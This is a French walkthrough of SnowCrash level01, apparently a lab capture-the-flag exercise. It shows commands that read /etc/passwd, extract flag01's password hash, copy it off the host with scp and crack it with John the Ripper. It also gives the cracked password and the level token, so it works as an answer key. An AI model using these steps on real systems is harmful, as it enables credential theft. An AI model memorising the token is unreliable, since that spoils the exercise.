# Level01


</br>
</br>


## Accéder au mot de passe à partir de /etc/shadow

```zsh
evel01@SnowCrash:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
level01@SnowCrash:~$ ls -al /etc/shadow
-rw-r----- 1 root shadow 4428 Mar  6  2016 /etc/shadow
```

</br>
</br>



## Accéder à /etc/passwd


```zsh
level01@SnowCrash:~$ cat /etc/passwd | grep flag01
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

Les mots de passe stockés dans /etc/passwd sont généralement stockés sous forme chiffrée, par exemple en utilisant une fonction de hachage telle que MD5 ou SHA-256.

</br>
</br>


## Décrypter "42hDRfypTqqnw" avec john the ripper

</br>

### 1. Enregistrer le mot de passe SCP dans un fichier et le déplacer localement

</br>

```zsh
cat /etc/passwd | grep flag01 | cut -d":" -f 2 > /tmp/passwd
```

local

```zsh
$> scp -P 4242 level01@192.168.56.2:/tmp/passwd ./

           _____                      _____               _
          / ____|                    / ____|             | |
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.56.2
level01@192.168.56.2's password:
passwd                                                   100%   14     5.9KB/s   00:00

$> john ./passwd --show
?:abcdefg

1 password hash cracked, 0 left
```

ssh

```zsh
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$ su level02
Password:
level02@SnowCrash:~$
```
